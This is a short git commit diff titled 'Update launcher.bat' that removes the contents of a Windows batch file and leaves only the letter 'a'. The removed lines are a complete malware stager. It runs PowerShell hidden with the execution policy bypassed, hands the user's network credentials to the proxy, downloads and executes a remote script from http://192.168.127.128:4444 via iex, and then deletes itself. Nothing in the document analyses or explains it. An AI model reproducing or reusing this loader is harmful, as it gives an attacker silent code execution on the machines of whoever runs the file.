2267c44f73209e1587f40c7d0b8e9db399d9b54c
Asd2120 <93842764+Asd2120@users.noreply.github.com>
2022-10-07 10:14:01 -0400

    Update launcher.bat

--- launcher.bat
+++ launcher.bat
@@ -1,3 +1,1 @@
-@echo off
-start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.127.128:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex"
-(goto) 2>nul & del "%~f0"
+a
